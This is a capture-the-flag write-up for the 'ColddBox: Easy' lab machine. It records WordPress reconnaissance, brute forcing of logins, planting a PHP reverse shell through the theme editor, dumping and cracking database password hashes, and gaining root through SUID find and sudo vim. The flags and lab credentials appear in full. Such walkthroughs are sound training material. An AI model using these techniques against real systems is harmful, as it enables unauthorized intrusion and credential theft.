# ColddBox:Easy

Laurent Chauvin | November 08, 2022

## Resources

[1] https://gtfobins.github.io/gtfobins/find/

## Progress

```
export IP=10.10.211.95
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-08 00:04 EST
Nmap scan report for 10.10.211.95
Host is up (0.10s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.34 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.211.95
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/08 00:07:19 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.211.95/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.211.95/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.211.95/wp-admin/]
/hidden               (Status: 301) [Size: 313] [--> http://10.10.211.95/hidden/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)===============================================================
2022/11/08 00:48:15 Finished
===============================================================
```

Nikto scan
```
nikto -h $IP | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.211.95
+ Target Hostname:    10.10.211.95
+ Target Port:        80
+ Start Time:         2022-11-08 00:07:30 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /hidden/: This might be interesting...
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-11-08 00:23:35 (GMT-5) (965 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nothing in 'robots.txt'.

Going to '/wp-links-opml.php' we can find wordpress version (might be useful to search for exploits)
```xml
<opml version="1.0">
	<head>
		<title>Links for ColddBox</title>
		<dateCreated>Tue, 08 Nov 2022 05:31:49 GMT</dateCreated>
		<!-- generator="WordPress/4.1.31" -->
	</head>
	<body> </body>
</opml>
```

Going to '/wp-includes' we can see lots of files.

Going to '/hidden' we are greated with this page
```
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

Maybe 'C0ldd', hugo' or 'philip' are usernames.

Going to '/wp-admin' is a login page.

Trying the obvious 'admin:admin', 'admin:password', etc... Nothing.

However, when trying random usernames we get an error
```
ERROR: Invalid username. Lost your password?
```

But when trying with 'C0ldd', 'hugo' or 'philip' we get
```
ERROR: The password you entered for the username hugo is incorrect. Lost your password?
ERROR: The password you entered for the username philip is incorrect. Lost your password?
ERROR: The password you entered for the username C0ldd is incorrect. Lost your password?
```

Which seem to indicate these usernames exists.

In the meantime, ```nikto``` found that 'xmlrpc.php' is present. Going there reveal
```
XML-RPC server accepts POST requests only.
```

Tried to play with xmlrpc, but could even list the methods available. Tried with Python and BurpSuite, and only got 500 Internal Error message.

Bruteforcing logins with ```wpscan``` we get
```
wpscan --url http://10.10.16.71 --password-attack wp-login -U C0ldd,hugo,philip --passwords /opt/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.16.71/ [10.10.16.71]
[+] Started: Tue Nov  8 01:27:26 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.16.71/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.16.71/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.16.71/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.16.71/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.16.71/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.16.71/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.16.71/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.16.71/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.16.71/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - C0ldd / 9876543210               
```

Now that we logged in as 'admin' let see what we can do. I searched to upload a file, but it seems not that easy.

However, if we go to 'Appearance -> Editor' we can modify existing php files.

I modified 'header.php' to include the php reverse shell from pentest monkey.

Then I started pwncat
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Then, I went to 'http://$IP/wp-content/themes/twentyfifteen/header.php'

And I got a shell. We can see the user flag in `c0ldd` home directory but we don't have permissions.

Let's check the '/var/www/html' directory
```
```

Let's check the 'wp-config.php'
```php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

Let's connect to mysql
```
mysql --user=c0ldd --password=cybersecurity colddbox
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [colddbox]>
```

List tables
```
MariaDB [colddbox]> show tables;
+-----------------------+
| Tables_in_colddbox    |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)
```

Let's get users and passwords from wp_users
```
MariaDB [colddbox]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
|  1 | c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
|  2 | hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
|  4 | philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
3 rows in set (0.00 sec)
```

Using ```nth``` on one of the hash, we can see it's probably using ```phpass```
```
nth --text '$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1'

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1

Most Likely 
Wordpress ≥ v2.6.2, HC: 400 JtR: phpass
Joomla ≥ v2.5.18, HC: 400 JtR: phpass
PHPass' Portable Hash, HC: 400 JtR: phpass
```

Passing these hashes to john, we get
```
john hash.txt --wordlist=/opt/rockyou.txt           
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9876543210       (c0ldd)     
password123456   (hugo)  
```

After running ```linpeas.sh``` we get the following interesting line
```
-rwsr-xr-x 1 root root 217K Feb  8  2016 /usr/bin/find
```

From GTFObins [1] we see
```
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit
```

Running this command, we get root
```
(remote) www-data@ColddBox-Easy:/dev/shm$ /usr/bin/find . -exec /bin/sh -p \; -quit
(remote) root@ColddBox-Easy:/dev/shm$          
(remote) root@ColddBox-Easy:/dev/shm$ whoami
root
```

Let's get the flags

For user first
```
(remote) root@ColddBox-Easy:/dev/shm$ cat /home/c0ldd/user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

Then root
```
(remote) root@ColddBox-Easy:/dev/shm$ cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

## Flag

1. User

```
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

2. Privesc

```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

## To Go Further

I'm not sure this is how it was supposed to be done, as we never managed to login as 'c0ldd'. I tried password '9876543210' but it didn't work.

After looking at a write-up, it turns out the password we found for the database 'cybersecurity' was also the password for the user 'c0ldd' on the machine. I thought I tested that, but I might have typed in wrong.

Then after we can check what he can sudo
```
(remote) c0ldd@ColddBox-Easy:/dev/shm$ sudo -l
[sudo] password for c0ldd: cybersecurity
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

If he can run ```vim``` we can use the same method as in previous challenges, where we execute commands in vim, such as ```:!/bin/bash -p``` and we get root access too
```
(remote) c0ldd@ColddBox-Easy:/dev/shm$ sudo /usr/bin/vim
<enter command :!/bin/bash -p>
root@ColddBox-Easy:/dev/shm# whoami
root
```
